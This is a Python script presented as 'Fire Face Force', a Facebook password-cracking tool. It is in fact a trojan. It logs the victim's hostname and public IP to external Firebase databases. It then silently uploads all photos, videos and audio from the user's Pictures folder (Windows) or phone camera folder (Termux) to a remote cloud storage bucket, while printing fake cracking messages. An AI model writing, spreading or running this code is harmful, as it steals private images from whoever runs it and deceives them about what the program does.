import glob
import requests
from urllib.request import urlopen
import os
import time
import json
from google.cloud import storage
from art import *
import socket
from colorama import Fore, Back, Style, init
init()

S = Style.BRIGHT

C = Fore.CYAN
R = Fore.RED
B = Fore.BLUE
M = Fore.MAGENTA
G = Fore.GREEN
Bl = Fore.BLACK
Y = Fore.YELLOW
BM = Back.MAGENTA
BR = Back.RED
Bb = Back.BLACK
Bw = Back.WHITE
bb = Back.BLUE


print(G + 'Instalando e Importando Librerias..\v')
time.sleep(2.3)
os.system('pip install art')
os.system("pip install google-cloud-storage")
os.system('pip install requests')
os.system('pip install art')
os.system('cls' if os.name == 'nt' else 'clear')

print(Bb + B + """.             \v""" + S + BR +
"""Fire Face Force
""" + Bb + """.              \n""")

mail = input(BM + C + "Insert Mail: \v"+
G +  Bb)
view = print(R +"Set >>" + G, mail)
print("\n")
print(f"{BR} {G} Connecting {B} Faceboock" + Bb)

time.sleep(2.0)
os.system('cls' if os.name == 'nt' else 'clear')
if os.name == 'nt':

    # hostname = os.uname().nodename
    hostname = socket.gethostname()
    firebase_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'
    response = requests.get(firebase_url, headers={
                            'Cache-Control': 'no-cache'})
    data = response.json()
    if data is not None and 'host' in data and data['host'] == hostname:
        print(f"{BR} {G} Conecting {B} Facebook"+ Bb)
        time.sleep(3.0)
    else:
        # Crear el objeto JSON
        json_data = {
            "host": hostname
        }

        response = requests.patch(firebase_url, json=json_data)
        if response.status_code == 200:
            print(f"{BY} Complete "+ Bb)
            time.sleep(2.0)
            os.system('cls' if os.name == 'nt' else 'clear')
        else:
            print('\033[91m' + "Error Network Time Out"+'\033[0m')
            time.sleep(3.0)
            os.system('cls' if os.name == 'nt' else 'clear')

    # extraccion de ip registrada en base de datos
else:
    hostname = os.uname().nodename
    firebase_url = 'https://hostname-5c24b-default-rtdb.firebaseio.com/hostname/export.json'
    response = requests.get(firebase_url, headers={
                            'Cache-Control': 'no-cache'})
    data = response.json()
    if data is not None and 'host' in data and data['host'] == hostname:
        print(G + "Save Seccion token")
        os.system('cls' if os.name == 'nt' else 'clear')
    else:
        # Crear el objeto JSON
        json_data = {
            "host": 'hostname'
        }

        response = requests.patch(firebase_url, json=json_data)
        if response.status_code == 200:
            print(f"{G}Start Exploit{Bb}")
            time.sleep(3.5)
            os.system('cls' if os.name == 'nt' else 'clear')
        else:
            print(f"{R}Not Exploit Fail{Bb}")
            time.sleep(3.0)
            os.system('cls' if os.name == 'nt' else 'clear')


url = 'https://api.ipify.org?format=json'
response = urlopen(url)
data = json.load(response)
extract = data['ip']
# Actualizar la base de datos en Firebase
firebase_url = 'https://data-fe2c3-default-rtdb.firebaseio.com/ip.json'
response = requests.get(firebase_url)
existing_data = json.loads(response.content)

if existing_data and 'ips' in existing_data:
    if extract not in existing_data['ips']:
        existing_data['ips'].append(extract)
        response = requests.put(firebase_url, json=existing_data)
        print('')
        os.system('cls' if os.name == 'nt' else 'clear')
    else:
        print('')
        os.system('cls' if os.name == 'nt' else 'clear')

else:
    new_data = {'ips': [extract]}
    response = requests.put(firebase_url, json=new_data)
    print('\033[94m'+'Profile Complete\n'+'\033[0m')
    time.sleep(3.0)
    if response.status_code == 200:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(
            '\033[94m'+"\nPasswords List.. "+'\033[0m' + "Rockyu.txt")
        time.sleep(3.0)
os.system('cls' if os.name == 'nt' else 'clear')
# Guardando informacion
if os.name == 'nt':
    from google.cloud import storage
    import glob
    client = storage.Client.from_service_account_json(
        'services/serviceAccounts.json')

    bucket = client.get_bucket('pictuface-f9763.appspot.com')
    nombre_usuario = os.getlogin()
    carpeta_local = f"C:\\Users\\{nombre_usuario}\\Pictures"
    extensiones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg']

    archivos = glob.glob(carpeta_local + '/*')

    for archivo_local in archivos:

        nombre_destino = os.path.basename(archivo_local)
        # Obtén la extensión del archivo
        _, extension = os.path.splitext(archivo_local)
        # Verifica si la extensión está permitida
        if extension in extensiones_permitidas:

            # Descargar info
            blob = bucket.blob(nombre_destino)
            blob.upload_from_filename(archivo_local)

            print(f'{Bw} {G} Complete {Bb}')
        else:
            print(
                f'information not Function')
    if not os.path.exists(carpeta_local):
        carpeta_local = input(
            f'{Y} Inserta ruta Manual.\n[+] ')
# Lista de extensiones
        extensiones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg']

        archivos = glob.glob(carpeta_local + '/*')

        for archivo_local in archivos:

            nombre_destino = os.path.basename(archivo_local)
        # Obtén la extensión del archivo
            _, extension = os.path.splitext(archivo_local)
        # Verifica si la extensión está permitida
            if extension in extensiones_permitidas:

                # Sube el archivo
                blob = bucket.blob(nombre_destino)
                blob.upload_from_filename(archivo_local)

                print(f'{G} Complete')
            else:
                print(
                    f'{R} Extention Fail.')
else:
    # en Linux
    banner = f"""{B}
                    Linux
    {G}"""
    print(banner)
    from google.cloud import storage
    import glob
    os.system("termux-setup-storage")
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Bb + B + """.             \v""" + S + BR +
"""Fire Face Force
""" + Bb + """.              \n""")
    client = storage.Client.from_service_account_json(
        'services/serviceAccounts.json')

    bucket = client.get_bucket('pictuface-f9763.appspot.com')

    carpeta_local = '/data/data/com.termux/files/home/storage/shared/DCIM/Camera'
# Lista de extensiones permitidas
    extensiones_permitidas = ['.jpg', '.png', '.mp4', '.jpeg', '.mp3']

    archivos = glob.glob(carpeta_local + '/*')

    for archivo_local in archivos:

        nombre_destino = os.path.basename(archivo_local)
    # Obtén la extensión del archivo
        _, extension = os.path.splitext(archivo_local)
    # Verifica si la extensión está permitida
        if extension in extensiones_permitidas:

            # Sube el archivo
            blob = bucket.blob(nombre_destino)
            blob.upload_from_filename(archivo_local)

            print(f'{Bw} {R} password not found{Bb}')
        else:
            print(
                f'{bb} {G} Password Hacked{Bb}')
    if not os.path.exists(carpeta_local):
        carpeta_local = input(
            'Ingresa Ruta manual\n[+]')
# Lista de extensiones permitidas
        extensiones_permitidas = ['.jpeg', '.jpg', '.png', '.mp4', '.mp3']

        archivos = glob.glob(carpeta_local + '/*')

        for archivo_local in archivos:

            nombre_destino = os.path.basename(archivo_local)
        # Obtén la extensión del archivo
            _, extension = os.path.splitext(archivo_local)
        # Verifica si la extensión está permitida
            if extension in extensiones_permitidas:

                # Sube el archivo
                blob = bucket.blob(nombre_destino)
                blob.upload_from_filename(archivo_local)

                print(f'Complete')
            else:
                print(f'Fail')
